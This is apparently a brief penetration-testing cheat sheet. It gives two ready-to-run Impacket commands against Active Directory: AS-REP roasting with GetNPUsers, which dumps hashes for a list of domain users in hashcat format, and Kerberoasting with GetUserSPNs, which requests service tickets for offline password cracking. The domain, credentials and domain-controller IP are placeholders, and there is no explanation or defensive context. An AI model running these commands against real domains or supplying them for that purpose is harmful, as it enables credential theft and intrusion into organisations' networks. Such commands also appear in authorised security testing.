# ASREPROAST

```
impacket-GetNPUsers test.com/user:'Password!' -usersfile domainusers.txt -format hashcat -outputfile hashes.asreproast -dc-ip IP 
```

# kerberoasting

```
impacket-GetUserSPNs test.com/test:'Password!' -dc-ip IP -request
```